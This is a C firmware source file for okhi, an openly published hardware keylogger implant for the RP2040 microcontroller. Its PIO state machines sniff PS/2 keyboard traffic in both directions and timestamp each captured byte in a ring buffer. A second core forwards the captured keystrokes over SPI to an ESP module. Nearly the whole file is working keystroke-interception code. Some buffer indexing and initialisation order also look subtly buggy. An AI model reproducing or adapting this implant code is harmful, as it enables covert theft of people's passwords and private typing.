/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
WARNING: BULLSHIT CODE X-)
---------------------------------------------------------------------------
*/

// I'm still a novice with the Pico SDK & RP2040, so please bear with me if there are unnecessary things ;-)

// This project assumes that copy_to_ram is enabled, so ALL code is running from RAM

#include "hardware/clocks.h"
#include "hardware/flash.h"
#include "hardware/irq.h"
#include "hardware/pio.h"
#include "hardware/pll.h"
#include "hardware/regs/io_qspi.h"
#include "hardware/spi.h"
#include "hardware/structs/clocks.h"
#include "hardware/structs/ioqspi.h"
#include "hardware/structs/pll.h"
#include "hardware/structs/sio.h"
#include "hardware/sync.h"
#include "hardware/timer.h"
#include "hardware/uart.h"
#include "hardware/watchdog.h"
#include "okhi.pio.h"
#include "pico/bootrom.h"
#include "pico/multicore.h"
#include "pico/stdlib.h"
#include <stdio.h>
#include <string.h>

#include "../../../../last_firmv.h"

#include "../../com/com.h"

#include "../../com/com_rp.h"

// uncomment to enable dev build
// #define DEV_BUILD 1 // NOT USED YET

// for UART debugging on devboard & HW version detection
#define GPIO_A 4
#define GPIO_B 5

#define BP() __asm("bkpt #1"); // breakpoint via software macro

#ifndef FLASH_PAGE_SIZE
#define FLASH_PAGE_SIZE 256
#endif
#ifndef FLASH_SECTOR_SIZE
#define FLASH_SECTOR_SIZE 4096
#endif
#define FLASH_TOTAL_SIZE (16 * 1024 * 1024)

#define USSEL_PIN 8
#define USOE_PIN 9

#define UART_BAUD 921600 // 460800 // 230400 // 115200
#define UART_ID uart1
#define UART_TX_PIN 4
#define UART_RX_PIN 5
#define DATA_BITS 8
#define STOP_BITS 1
#define PARITY UART_PARITY_NONE

#define SPI_BAUD 5000000 // ~4.6 mhz
#define SPI_ID spi1
#define SPI_SCK_PIN 10
#define SPI_MOSI_PIN 11
#define SPI_MISO_PIN 12
#define SPI_CS_PIN 13

// Must be in that order
#define AUX_H2D_JMP_GPIO 19 // PIO JMP HELPER PIN FOR HOST TO DEVICE PIO (must be a free GPIO pin)
#define DAT_GPIO 20         // PS/2 data
#define CLK_GPIO 21         // PS/2 clock
#define AUX_D2H_JMP_GPIO 22 // PIO JMP HELPER PIN FOR DEVICE TO HOST PIO (must be a free GPIO pin)
#define EBOOT_MASTERDATAREADY_GPIO 14
#define ELOG_SLAVEREADY_GPIO 15
#define ESP_RESET_GPIO 28

/*
Attempting to achieve the minimum necessary delay for the ESP Slave SPI CS signal
-
90 NOP at 125 MHz = 0.72 us. Our SPI runs at ~5 MHz, so 0.72 us is a delay of approximately 3.6 SPI clock cycles.
Overclocking CPU frequency to 250 MHz reduces NOP execution time to 0.36 us,
corresponding to approximately 1.8 SPI clock cycles.
-
https://github.com/espressif/esp-idf/blob/v5.2.2/examples/peripherals/spi_slave/sender/main/app_main.c
spi_device_interface_config_t devcfg = {
...
        .cs_ena_posttrans = 3,
...
Keep the CS low 3 cycles after transaction,
to stop slave from missing the last bit when CS has less propagation delay than CLK
*/
#define delay_cs()                                                                                                     \
    asm volatile("nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t"           \
                 "nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t");

#define delay_cs_pre() delay_cs();
#define delay_cs_pos() delay_cs();
#define CS_LOW()                                                                                                       \
    asm volatile("nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop");                                                  \
    gpio_put(SPI_CS_PIN, false);                                                                                       \
    delay_cs_pre();
#define CS_HIGH()                                                                                                      \
    delay_cs_pos();                                                                                                    \
    gpio_put(SPI_CS_PIN, true);                                                                                        \
    asm volatile("nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop");

#define RING_BUFF_MAX_ENTRIES 800

typedef enum
{
    VERSION_00 = 0,
    VERSION_01,
    VERSION_10,
    VERSION_11,
    VERSION_FF,
    VERSION_0F,
    VERSION_1F,
    VERSION_F0,
    VERSION_F1,
    VERSION_UNKNOWN
} hw_version_t;

typedef enum
{
    PIN_STATE_LOW = 0,
    PIN_STATE_HIGH,
    PIN_STATE_FLOATING
} pin_state_t;

extern char __flash_binary_end;

volatile static unsigned int write_index = 0;
volatile static char ringbuff[RING_BUFF_MAX_ENTRIES][32];
volatile static uint kbd_h2d_sm;
volatile static uint offset_kbd_h2d;
volatile static uint kbd_sm;
volatile static uint offset_kbd;
volatile static int inhnr;
volatile static bool last_state_idle;
volatile static int inidle;
volatile static int inidletoggle;
volatile static bool inh_fired;
volatile char *hwver_name = "UNKNOWN";
volatile static hw_version_t hwver = VERSION_UNKNOWN;

static pin_state_t get_pin_state(uint gpio)
{
    gpio_init(gpio);
    gpio_pull_up(gpio);
    sleep_ms(5);
    bool pull_up_state = gpio_get(gpio);

    gpio_pull_down(gpio);
    sleep_ms(5);
    bool pull_down_state = gpio_get(gpio);

    gpio_deinit(gpio);

    if (pull_up_state && !pull_down_state)
    {
        return PIN_STATE_FLOATING;
    }

    return pull_up_state ? PIN_STATE_HIGH : PIN_STATE_LOW;
}

static hw_version_t detect_hw_version(void)
{
    pin_state_t state_a = get_pin_state(GPIO_A);
    pin_state_t state_b = get_pin_state(GPIO_B);

    if (state_a == PIN_STATE_FLOATING && state_b == PIN_STATE_FLOATING)
    {
        return VERSION_FF;
    }
    else if (state_a == PIN_STATE_LOW && state_b == PIN_STATE_FLOATING)
    {
        return VERSION_0F;
    }
    else if (state_a == PIN_STATE_HIGH && state_b == PIN_STATE_FLOATING)
    {
        return VERSION_1F;
    }
    else if (state_a == PIN_STATE_FLOATING && state_b == PIN_STATE_LOW)
    {
        return VERSION_F0;
    }
    else if (state_a == PIN_STATE_FLOATING && state_b == PIN_STATE_HIGH)
    {
        return VERSION_F1;
    }
    else if (state_a == PIN_STATE_LOW && state_b == PIN_STATE_LOW)
    {
        return VERSION_00;
    }
    else if (state_a == PIN_STATE_LOW && state_b == PIN_STATE_HIGH)
    {
        return VERSION_01;
    }
    else if (state_a == PIN_STATE_HIGH && state_b == PIN_STATE_LOW)
    {
        return VERSION_10;
    }
    else if (state_a == PIN_STATE_HIGH && state_b == PIN_STATE_HIGH)
    {
        return VERSION_11;
    }
    else
    {
        return VERSION_UNKNOWN;
    }
}

static int init_ver(void)
{
    hwver = detect_hw_version();

    switch (hwver)
    {
        case VERSION_00:
            hwver_name = "00";
            printf("Hardware version: 00\n");
            break;

        case VERSION_01:
            hwver_name = "01";
            printf("Hardware version: 01\n");
            break;

        case VERSION_10:
            hwver_name = "10";
            printf("Hardware version: 10\n");
            break;

        case VERSION_11:
            hwver_name = "11";
            printf("Hardware version: 11\n");
            break;

        case VERSION_FF:
            hwver_name = "FF";
            printf("Hardware version: FF (both floating)\n");
            break;

        case VERSION_0F:
            hwver_name = "0F";
            printf("Hardware version: 0F (A low, B floating)\n");
            break;

        case VERSION_1F:
            hwver_name = "1F";
            printf("Hardware version: 1F (A high, B floating)\n");
            break;

        case VERSION_F0:
            hwver_name = "F0";
            printf("Hardware version: F0 (A floating, B low)\n");
            break;

        case VERSION_F1:
            hwver_name = "F1";
            printf("Hardware version: F1 (A floating, B high)\n");
            break;

        default:
            hwver_name = "UK";
            printf("Hardware version: Unknown\n");
            break;
    }

    return 0;
}

static int my_spi_write_blocking(const uint8_t *src, size_t len)
{
    CS_LOW();
    int retf = spi_write_blocking(SPI_ID, src, len);
    CS_HIGH();

    return retf;
}

static int my_spi_read_blocking(uint8_t *dst, size_t len)
{
    CS_LOW();
    // repeated_tx_data is output repeatedly on TX as data is read in from RX. Generally this can be 0
    int retf = spi_read_blocking(SPI_ID, 0, dst, len);
    CS_HIGH();

    return retf;
}

static int my_spi_write_read_blocking(const uint8_t *src, uint8_t *dst, size_t len)
{
    CS_LOW();
    int retf = spi_write_read_blocking(SPI_ID, src, dst, len);
    CS_HIGH();

    return retf;
}

static void free_all_pio_state_machines(PIO pio)
{
    for (int sm = 0; sm < 4; sm++)
    {
        if (pio_sm_is_claimed(pio, sm))
        {
            pio_sm_unclaim(pio, sm);
        }
    }
}

static unsigned char *get_base_flash_space_addr(void)
{
    return (unsigned char *)XIP_BASE;
}

static uint32_t get_start_free_flash_space_addr(void)
{
    return ((((uint32_t)XIP_BASE) + ((uint32_t)__flash_binary_end) + (FLASH_PAGE_SIZE - 1)) & ~(FLASH_PAGE_SIZE - 1));
}

static uint32_t get_flash_end_address(void)
{
    return ((((((uint32_t)XIP_BASE)) + (PICO_FLASH_SIZE_BYTES - 1)) + (FLASH_PAGE_SIZE - 1)) & ~(FLASH_PAGE_SIZE - 1));
}

static uint32_t get_free_flash_space(void)
{
    return get_flash_end_address() - get_start_free_flash_space_addr();
}

static void erase_flash(void)
{
    flash_range_erase(0, PICO_FLASH_SIZE_BYTES);
    reset_usb_boot(0, 0);
}

static void restart_device_to_host_sm(void)
{
    pio_sm_exec(pio0, kbd_sm, pio_encode_jmp(offset_kbd));
}

static void restart_host_to_device_sm(void)
{
    pio_sm_exec(pio1, kbd_h2d_sm, pio_encode_jmp(offset_kbd_h2d));
}

static void stop_device_to_host_sm(void)
{
    gpio_put(AUX_D2H_JMP_GPIO, true);
    while (!gpio_get(AUX_D2H_JMP_GPIO))
    {
        tight_loop_contents();
    }
    restart_device_to_host_sm();
}

static void start_device_to_host_sm(void)
{
    gpio_put(AUX_D2H_JMP_GPIO, false);
    restart_device_to_host_sm();
}

// IRQ0: Inhibited communication detected
// IRQ1: No Host Request-to-Send detected after inhibiting communication
void pio0_irq(void)
{
    // printf("\r\nPIO0 IRQ!\r\n");
    if (pio0_hw->irq & 1)
    {
        // printf("PIO0 IRQ & 1: %d\r\n", inhnr++);
        pio0_hw->irq = 1;
        stop_device_to_host_sm();
    }
    else if (pio0_hw->irq & 2)
    {
        // printf("PIO0 IRQ & 2: %d\r\n", inhnr++);
        pio0_hw->irq = 2;
        start_device_to_host_sm();
        restart_host_to_device_sm();
    }
}

// IRQ0: IDLE DETECTED, CLOCK is HIGH + DAT is HIGH for at least 100 microseconds
void pio1_irq(void)
{
    // printf("\r\nPIO1 IRQ!\r\n");
    if (pio1_hw->irq & 1)
    {
        // printf("PIO1 IRQ & 1: %d\r\n", inidle++);
        pio1_hw->irq = 1;
        start_device_to_host_sm();
        restart_host_to_device_sm();
    }
    else if (pio1_hw->irq & 2)
    {
        // printf("PIO1 IRQ & 2: %d\r\n", inhnr++);
        pio1_hw->irq = 2;
    }
}

__attribute__((section(".uninitialized_data"))) uint32_t wait_20;

void gpio_callback(uint gpio, uint32_t events)
{
    // For devboard :D
    if (gpio == ESP_RESET_GPIO)
    {
        gpio_init(ESP_RESET_GPIO);
        gpio_set_dir(ESP_RESET_GPIO, GPIO_IN);
        gpio_init(EBOOT_MASTERDATAREADY_GPIO);
        gpio_set_dir(EBOOT_MASTERDATAREADY_GPIO, GPIO_IN);
        gpio_init(ELOG_SLAVEREADY_GPIO);
        gpio_set_dir(ELOG_SLAVEREADY_GPIO, GPIO_IN);

        wait_20 = 0x69699696;
        puts("\r\nexternal ESP-RESET detected!\r\nrebooting in 50 secs!!!\r\n");
        watchdog_reboot(0, 0, 0);
    }
}

void core1_main()
{
    sleep_ms(2000);
    gpio_init(ESP_RESET_GPIO);
    gpio_set_dir(ESP_RESET_GPIO, GPIO_IN);
    gpio_pull_up(ESP_RESET_GPIO);
    sleep_ms(2000);

    gpio_set_irq_enabled_with_callback(ESP_RESET_GPIO, GPIO_IRQ_EDGE_FALL, true, &gpio_callback);

    uart_init(uart0, 74880);
    gpio_set_function(16, GPIO_FUNC_UART);
    gpio_set_function(17, GPIO_FUNC_UART);
    // UART 8N1: 1 start bit, 8 data bits, no parity bit, 1 stop bit
    uart_set_hw_flow(uart0, false, false);
    uart_set_format(uart0, DATA_BITS, STOP_BITS, PARITY);
    uart_set_fifo_enabled(uart0, false);
    uart_set_irq_enables(uart0, false, false);

    gpio_init(ELOG_SLAVEREADY_GPIO);
    gpio_set_dir(ELOG_SLAVEREADY_GPIO, GPIO_IN);
    gpio_pull_up(ELOG_SLAVEREADY_GPIO);
    for (int i = 0; i < 3000; i++)
    {
        if (gpio_get(ELOG_SLAVEREADY_GPIO))
        {
            printf("ESP slave not ready yet... %d\r\n", i);
        }
        else
        {
            break;
        }
        tight_loop_contents();
    }
    gpio_init(EBOOT_MASTERDATAREADY_GPIO);
    gpio_set_dir(EBOOT_MASTERDATAREADY_GPIO, GPIO_OUT);
    gpio_put(EBOOT_MASTERDATAREADY_GPIO, false);

    unsigned int read_index = 0;
    unsigned int total_packets_sended = 0;
    unsigned int g = 0;
    unsigned int z = 90000000 + 1;
    unsigned int last_sended = 0;
    while (1)
    {
        static unsigned char line[32] = {0};
        while (read_index != write_index)
        {
            sprintf((char *)line, "%s   \r\n", (char *)&(ringbuff[read_index++ % (RING_BUFF_MAX_ENTRIES - 1)][32]));
            gpio_put(EBOOT_MASTERDATAREADY_GPIO, true);
            while (!gpio_get(ELOG_SLAVEREADY_GPIO))
            {
                tight_loop_contents();
            }
            gpio_put(EBOOT_MASTERDATAREADY_GPIO, false);
            my_spi_write_blocking(line, strlen((char *)line));
            printf("%s", line);
            total_packets_sended++;
        }
        if (last_sended != total_packets_sended && g++ > 20000000)
        {
            z = 0;
            g = 0;
            last_sended = total_packets_sended;
            sprintf((char *)line, "HWv%s packets sended: 0x%x", hwver_name, total_packets_sended);
            uart_write_blocking(uart0, line, strlen((char *)line) + 1);
            puts((char *)line);
        }
        else if (z++ > 90000000)
        {
            z = 0;
            g = 0;
            sprintf((char *)line, "HWv%s packets sended: 0x%x", hwver_name, total_packets_sended);
            uart_write_blocking(uart0, line, strlen((char *)line) + 1);
            puts((char *)line);
        }
    }
}

static void pio_destroy(void)
{
    free_all_pio_state_machines(pio0);
    free_all_pio_state_machines(pio1);
    pio_clear_instruction_memory(pio0);
    pio_clear_instruction_memory(pio1);
}

static bool bootsel_pressed_safely(void)
{
    const uint CS_INDEX = 1;
    uint32_t flags = save_and_disable_interrupts();

    hw_write_masked(&ioqspi_hw->io[CS_INDEX].ctrl, GPIO_OVERRIDE_LOW << IO_QSPI_GPIO_QSPI_SS_CTRL_OEOVER_LSB,
                    IO_QSPI_GPIO_QSPI_SS_CTRL_OEOVER_BITS);

    for (volatile int i = 0; i < 1000; ++i)
    {
        tight_loop_contents();
    }

    bool pressed = !(sio_hw->gpio_hi_in & (1u << CS_INDEX));

    hw_write_masked(&ioqspi_hw->io[CS_INDEX].ctrl, GPIO_OVERRIDE_NORMAL << IO_QSPI_GPIO_QSPI_SS_CTRL_OEOVER_LSB,
                    IO_QSPI_GPIO_QSPI_SS_CTRL_OEOVER_BITS);

    restore_interrupts(flags);

    return pressed;
}

static void boot_press(void)
{
    int x = 0;
    for (int i = 0; i < 500; i++)
    {
        if (bootsel_pressed_safely())
        {
            x++;
        }
    }

    if (x > 90)
    {
        /*
        printf("Bootsel pressed!\r\n");
        blink_led(5);
        */
        reset_usb_boot(0, 0);
    }
}

int main(void)
{
    boot_press();
    blink_led(2);

    if (wait_20 == 0x69699696)
    {
        stdio_init_all();
        puts("\r\nwaiting 50 secs...\r\n");
        wait_20 = 0;
        sleep_ms(50000);
    }

    gpio_init(ESP_RESET_GPIO);
    gpio_set_dir(ESP_RESET_GPIO, GPIO_OUT);
    gpio_put(ESP_RESET_GPIO, false);

    gpio_init(EBOOT_MASTERDATAREADY_GPIO);
    gpio_set_dir(EBOOT_MASTERDATAREADY_GPIO, GPIO_IN);
    gpio_init(ELOG_SLAVEREADY_GPIO);
    gpio_set_dir(ELOG_SLAVEREADY_GPIO, GPIO_IN);

    gpio_init(USSEL_PIN);
    gpio_set_dir(USSEL_PIN, GPIO_OUT);
    gpio_put(USSEL_PIN, false);

    gpio_init(USOE_PIN);
    gpio_set_dir(USOE_PIN, GPIO_OUT);
    gpio_put(USOE_PIN, true);

    init_ver();

    // uart init must be called after init_ver(), because on devboard the same pins are used for UART
    stdio_init_all();

    gpio_put(USSEL_PIN, true);

    sleep_ms(100);

    printf("\r\nokhi started! Hardware v%s\r\nBuild Date %s %s\r\n", hwver_name, __DATE__, __TIME__);
    fflush(stdout);

    uint32_t baud __attribute__((unused)) = spi_init(SPI_ID, SPI_BAUD);
    gpio_set_function(SPI_SCK_PIN, GPIO_FUNC_SPI);
    gpio_set_function(SPI_MOSI_PIN, GPIO_FUNC_SPI);
    gpio_set_function(SPI_MISO_PIN, GPIO_FUNC_SPI);
    // The CS pin is controlled manually
    gpio_init(SPI_CS_PIN);
    gpio_set_dir(SPI_CS_PIN, GPIO_OUT);
    gpio_put(SPI_CS_PIN, true);
    // SPI mode 0: 8 data bits, MSB first, CPOL=0, CPHA=0
    spi_set_format(SPI_ID, 8, SPI_CPOL_0, SPI_CPHA_0, SPI_MSB_FIRST);
    printf("Firmware version: v%s\r\n", FIRMV_STR);
    printf("SPI Mode 0: %.2f MHz (%d)\r\n", ((float)baud) / 1000000.0, baud);

    gpio_put(USOE_PIN, false);

    printf("flash free space addr: 0x%08x\r\n"
           "flash end addr: 0x%08x\r\n"
           "flash free space size: 0x%08x bytes\r\n",
           get_start_free_flash_space_addr(), get_flash_end_address(), get_free_flash_space());

    // GPIO configuration for all PIO programs:
    gpio_init(DAT_GPIO);
    gpio_set_dir(DAT_GPIO, GPIO_IN);
    gpio_pull_up(DAT_GPIO);
    gpio_init(CLK_GPIO);
    gpio_set_dir(CLK_GPIO, GPIO_IN);
    gpio_pull_up(CLK_GPIO);
    gpio_init(AUX_D2H_JMP_GPIO);
    gpio_set_dir(AUX_D2H_JMP_GPIO, GPIO_OUT);
    gpio_put(AUX_D2H_JMP_GPIO, false);
    gpio_init(AUX_H2D_JMP_GPIO);
    gpio_set_dir(AUX_H2D_JMP_GPIO, GPIO_OUT);
    gpio_put(AUX_H2D_JMP_GPIO, true);
    asm volatile("nop \n\t nop \n\t nop \n\t nop \n\t nop \n\t nop");
    printf("CLK_GPIO: %d\r\n", gpio_get(CLK_GPIO));
    printf("DAT_GPIO: %d\r\n", gpio_get(DAT_GPIO));
    printf("JMP_AUX D2H: %d\r\n", gpio_get(AUX_D2H_JMP_GPIO));
    printf("JMP_AUX H2D: %d\r\n", gpio_get(AUX_H2D_JMP_GPIO));

    pio_destroy();

    // host to device:
    // get a state machine
    kbd_h2d_sm = pio_claim_unused_sm(pio1, true);
    // reserve program space in SM memory
    offset_kbd_h2d = pio_add_program(pio1, &host_to_device_program);
    // Set pin directions base
    pio_sm_set_consecutive_pindirs(pio1, kbd_sm, DAT_GPIO, 2, false);
    // program the start and wrap SM registers
    pio_sm_config c_kbd_h2d = device_to_host_program_get_default_config(offset_kbd_h2d);
    // Set the base input pin. pin index 0 is DAT, index 1 is CLK
    sm_config_set_in_pins(&c_kbd_h2d, DAT_GPIO);
    // Shift 8 bits to the right, autopush disabled
    sm_config_set_in_shift(&c_kbd_h2d, true, false, 0);
    // JMP pin
    sm_config_set_jmp_pin(&c_kbd_h2d, CLK_GPIO);
    // Deeper FIFO as we're not doing any TX
    sm_config_set_fifo_join(&c_kbd_h2d, PIO_FIFO_JOIN_RX);
    // Must run ~133.6 kHz, 7.5 microseconds per cycle
    // it is expected to have no fewer than 8 PIO state machine cycles for each keyboard clock cycle
    float div_kbd_h2d = (float)clock_get_hz(clk_sys) / (8 * 16700);
    sm_config_set_clkdiv(&c_kbd_h2d, div_kbd_h2d);
    // Initialize the state machine
    pio_sm_init(pio1, kbd_h2d_sm, offset_kbd_h2d, &c_kbd_h2d);
    pio_sm_set_enabled(pio1, kbd_h2d_sm, false);
    pio_sm_clear_fifos(pio1, kbd_h2d_sm);
    pio_sm_restart(pio1, kbd_h2d_sm);
    pio_sm_clkdiv_restart(pio1, kbd_h2d_sm);
    pio_sm_set_enabled(pio1, kbd_h2d_sm, true);
    pio_sm_exec(pio1, kbd_h2d_sm, pio_encode_jmp(offset_kbd_h2d));

    // idle detection:
    // get a state machine
    uint kbd_idle_sm = pio_claim_unused_sm(pio1, true);
    // reserve program space in SM memory
    uint offset_idle = pio_add_program(pio1, &idle_signal_program);
    // Set pin directions base
    pio_sm_set_consecutive_pindirs(pio1, kbd_idle_sm, DAT_GPIO, 2, false);
    // program the start and wrap SM registers
    pio_sm_config c_idle = idle_signal_program_get_default_config(offset_idle);
    // Set the base input pin. pin index 0 is DAT
    sm_config_set_in_pins(&c_idle, DAT_GPIO);
    // Deeper FIFO as we're not doing any TX
    sm_config_set_fifo_join(&c_idle, PIO_FIFO_JOIN_RX);
    // JMP pin (CLOCK)
    sm_config_set_jmp_pin(&c_idle, CLK_GPIO);
    // 1 MHz
    float div_idle = clock_get_hz(clk_sys) / 1000000.0;
    sm_config_set_clkdiv(&c_idle, div_idle);
    // Set IRQ handler
    pio_set_irq0_source_mask_enabled(pio1, 0x0F00, true);
    irq_set_exclusive_handler(PIO1_IRQ_0, pio1_irq);
    irq_set_enabled(PIO1_IRQ_0, true);
    // initialize the state machine
    pio_sm_init(pio1, kbd_idle_sm, offset_idle, &c_idle);
    pio_sm_set_enabled(pio1, kbd_idle_sm, false);
    pio_sm_clear_fifos(pio1, kbd_idle_sm);
    pio_sm_restart(pio1, kbd_idle_sm);
    pio_sm_clkdiv_restart(pio1, kbd_idle_sm);
    pio_sm_set_enabled(pio1, kbd_idle_sm, true);
    pio_sm_exec(pio1, kbd_idle_sm, pio_encode_jmp(offset_idle));

    // inhibited detection:
    // get a state machine
    uint kbd_inh_sm = pio_claim_unused_sm(pio0, true);
    // reserve program space in SM memory
    uint offset_inh = pio_add_program(pio0, &inhibited_signal_program);
    // Set pin directions base
    pio_sm_set_consecutive_pindirs(pio0, kbd_inh_sm, DAT_GPIO, 2, false);
    // program the start and wrap SM registers
    pio_sm_config c_inh = inhibited_signal_program_get_default_config(offset_inh);
    // Set the base input pin. pin index 0 is DAT
    sm_config_set_in_pins(&c_inh, DAT_GPIO);
    // Deeper FIFO as we're not doing any TX
    sm_config_set_fifo_join(&c_inh, PIO_FIFO_JOIN_RX);
    // JMP pin (CLOCK)
    sm_config_set_jmp_pin(&c_inh, CLK_GPIO);
    // 1 MHz
    float div_inh = clock_get_hz(clk_sys) / 1000000.0;
    sm_config_set_clkdiv(&c_inh, div_inh);
    // Set IRQ handler
    pio_set_irq0_source_mask_enabled(pio0, 0x0F00, true);
    irq_set_exclusive_handler(PIO0_IRQ_0, pio0_irq);
    irq_set_enabled(PIO0_IRQ_0, true);
    // initialize the state machine
    pio_sm_init(pio0, kbd_inh_sm, offset_inh, &c_inh);
    pio_sm_set_enabled(pio0, kbd_inh_sm, false);
    pio_sm_clear_fifos(pio0, kbd_inh_sm);
    pio_sm_restart(pio0, kbd_inh_sm);
    pio_sm_clkdiv_restart(pio0, kbd_inh_sm);
    pio_sm_set_enabled(pio0, kbd_inh_sm, true);
    pio_sm_exec(pio0, kbd_inh_sm, pio_encode_jmp(offset_inh));

    // device to host:
    // get a state machine
    kbd_sm = pio_claim_unused_sm(pio0, true);
    // reserve program space in SM memory
    offset_kbd = pio_add_program(pio0, &device_to_host_program);
    // Set pin directions base
    pio_sm_set_consecutive_pindirs(pio0, kbd_sm, DAT_GPIO, 3, false);
    // program the start and wrap SM registers
    pio_sm_config c_kbd = device_to_host_program_get_default_config(offset_kbd);
    // Set the base input pin. pin index 0 is DAT, index 1 is CLK
    sm_config_set_in_pins(&c_kbd, DAT_GPIO);
    // Shift 8 bits to the right, autopush disabled
    // sm_config_set_in_shift(&c_kbd, true, true, 8);
    sm_config_set_in_shift(&c_kbd, true, false, 0);
    // JMP pin
    sm_config_set_jmp_pin(&c_kbd, AUX_D2H_JMP_GPIO);
    // Deeper FIFO as we're not doing any TX
    sm_config_set_fifo_join(&c_kbd, PIO_FIFO_JOIN_RX);
    // Must run ~133.6 kHz, 7.5 microseconds per cycle
    // it is expected to have no fewer than 8 PIO state machine cycles for each keyboard clock cycle
    float div_kbd = (float)clock_get_hz(clk_sys) / (8 * 16700);
    sm_config_set_clkdiv(&c_kbd, div_kbd);
    // Initialize the state machine
    pio_sm_init(pio0, kbd_sm, offset_kbd, &c_kbd);
    pio_sm_set_enabled(pio0, kbd_sm, false);
    pio_sm_clear_fifos(pio0, kbd_sm);
    pio_sm_restart(pio0, kbd_sm);
    pio_sm_clkdiv_restart(pio0, kbd_sm);
    pio_sm_set_enabled(pio0, kbd_sm, true);
    pio_sm_exec(pio0, kbd_sm, pio_encode_jmp(offset_kbd));

    start_device_to_host_sm();
    restart_host_to_device_sm();

    multicore_launch_core1(core1_main);
    sleep_ms(1);
    multicore_reset_core1();
    multicore_launch_core1(core1_main);

    while (1)
    {
        /* The pushed value is an 8-bit sample positioned in the upper (most significant) byte of the
         32-bit FIFO word, In C, you can read this byte from:

           io_rw_8* rxfifo_shift = (io_rw_8*)&pio->rxf[sm] + 3;

           This offset (+3) accesses the top byte of the 32-bit word in which the data resides. */
        if (!pio_sm_is_rx_fifo_empty(pio1, kbd_h2d_sm))
        {
            uint8_t byte = *((io_rw_8 *)&pio1->rxf[kbd_h2d_sm] + 3);
            sprintf((char *)&(ringbuff[write_index % (RING_BUFF_MAX_ENTRIES - 1)][32]), "%c:0x%02X t:0x%08X ; ", 'H',
                    byte, us_to_ms(time_us_64()));
            write_index++;
        }
        if (!pio_sm_is_rx_fifo_empty(pio0, kbd_sm))
        {
            uint8_t byte = *((io_rw_8 *)&pio0->rxf[kbd_sm] + 3);
            sprintf((char *)&(ringbuff[write_index % (RING_BUFF_MAX_ENTRIES - 1)][32]), "%c:0x%02X t:0x%08X ; ", 'D',
                    byte, us_to_ms(time_us_64()));
            write_index++;
        }
    }

    return 0;
}
